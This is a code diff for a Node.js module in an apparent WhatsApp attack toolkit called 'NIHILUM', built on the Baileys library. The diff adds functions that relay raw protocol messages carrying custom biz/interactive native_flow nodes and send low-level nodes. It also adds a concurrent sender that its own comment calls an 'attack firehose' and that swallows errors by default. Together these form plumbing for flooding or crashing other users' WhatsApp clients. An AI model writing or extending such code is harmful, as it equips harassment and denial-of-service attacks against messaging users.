@@ -1,58 +1,101 @@
-// language: Node.js
-// Stubs — implement after full Baileys source is in-repo.
-// These show the API NIHILUM attack modules should call.
+// language: Node.js, file: src/nihilum/raw.js
+// Raw relay / node / burst — no silent swallow on burst by default
 'use strict';
 
+function getBaileys() {
+  return require('@whiskeysockets/baileys');
+}
+
+function bizInteractiveNodes(flowName = 'mixed') {
+  return [
+    {
+      tag: 'biz',
+      attrs: { actual_actors: '2', host_storage: '2' },
+      content: [
+        {
+          tag: 'interactive',
+          attrs: { type: 'native_flow', v: '1' },
+          content: [{ tag: 'native_flow', attrs: { v: '9', name: flowName } }],
+        },
+      ],
+    },
+  ];
+}
+
 /**
- * Send a pre-built proto message without high-level Baileys helpers.
- * @param {import('@whiskeysockets/baileys').WASocket} sock
- * @param {string} jid
- * @param {object} message — WAMessageContent shape
- * @param {object} [opts]
+ * Build WAMessageContent and relay — prefers sock.relayMessage
  */
-async function sendRaw(sock, jid, message, opts = {}) {
-  const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
-  const full = generateWAMessageFromContent(jid, message, opts);
+async function relayRaw(sock, jid, content, opts = {}) {
+  if (!sock) throw new Error('relayRaw: no sock');
+  if (!jid) throw new Error('relayRaw: no jid');
+
+  if (typeof sock.relayMessage !== 'function') {
+    // last resort: sendMessage with interactive blob if present
+    if (content?.interactiveMessage && typeof sock.sendMessage === 'function') {
+      return sock.sendMessage(jid, content.interactiveMessage);
+    }
+    throw new Error('relayRaw: relayMessage unavailable');
+  }
+
+  const { generateWAMessageFromContent } = getBaileys();
+  const full = generateWAMessageFromContent(jid, content, opts.generateOpts || {});
+  const messageId = opts.messageId || full.key?.id;
+
   await sock.relayMessage(jid, full.message, {
-    messageId: full.key.id,
+    messageId,
     additionalNodes: opts.additionalNodes,
+    additionalAttributes: opts.additionalAttributes,
   });
   return full;
 }
 
 /**
- * Fire many sends with limited concurrency (no long awaits between each).
- * @param {Function} sendFn async () => void
- * @param {number} concurrency
+ * Send a binary-tree node if the socket exposes sendNode
  */
-async function sendBurst(tasks, concurrency = 8) {
-  const queue = tasks.slice();
-  const workers = Array.from({ length: Math.min(concurrency, queue.length) }, async () => {
-    while (queue.length) {
-      const t = queue.shift();
-      try { await t(); } catch (_) {}
-    }
-  });
-  await Promise.all(workers);
+async function sendNodeRaw(sock, node) {
+  if (!sock) throw new Error('sendNodeRaw: no sock');
+  if (typeof sock.sendNode === 'function') return sock.sendNode(node);
+  if (typeof sock.query === 'function' && node?.tag) {
+    // some forks route custom iq via query — best-effort
+    return sock.query(node);
+  }
+  throw new Error('sendNodeRaw: sendNode not available on this Baileys build');
 }
 
 /**
- * Interactive + biz additionalNodes helper
+ * Limited-concurrency task runner
+ * @param {Array<() => Promise>} tasks
+ * @param {number} concurrency
+ * @param {{ swallow?: boolean }} opts — swallow=false logs and rethrows aggregate
  */
-function bizInteractiveNodes(flowName = 'mixed') {
-  return [{
-    tag: 'biz',
-    attrs: { actual_actors: '2', host_storage: '2' },
-    content: [{
-      tag: 'interactive',
-      attrs: { type: 'native_flow', v: '1' },
-      content: [{ tag: 'native_flow', attrs: { v: '9', name: flowName } }],
-    }],
-  }];
+async function sendBurst(tasks, concurrency = 8, opts = {}) {
+  const swallow = opts.swallow !== false; // default true for attack firehose
+  const queue = tasks.slice();
+  const errors = [];
+  const n = Math.min(Math.max(1, concurrency), queue.length || 1);
+
+  await Promise.all(
+    Array.from({ length: n }, async () => {
+      while (queue.length) {
+        const t = queue.shift();
+        if (!t) break;
+        try {
+          await t();
+        } catch (e) {
+          errors.push(e);
+          if (!swallow) console.error('[nihilum:burst]', e.message || e);
+        }
+      }
+    })
+  );
+
+  return { ok: errors.length === 0, errors };
 }
 
 module.exports = {
-  sendRaw,
+  relayRaw,
+  sendNodeRaw,
   sendBurst,
   bizInteractiveNodes,
+  getBaileys,
 };
